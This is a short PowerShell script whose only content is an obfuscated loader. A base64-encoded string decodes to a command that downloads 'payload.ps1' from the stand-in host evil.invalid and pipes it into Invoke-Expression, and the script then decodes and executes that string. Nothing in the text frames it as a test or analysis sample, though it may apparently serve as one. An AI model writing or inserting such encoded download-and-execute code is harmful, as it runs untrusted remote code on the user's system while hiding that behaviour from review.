[CmdletBinding()]
param()

$ErrorActionPreference = 'Stop'
$encodedPayload = 'SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGUAdgBpAGwALgBpAG4AdgBhAGwAaQBkAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAIAB8ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA=='
$decodedPayload = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedPayload))
Invoke-Expression $decodedPayload
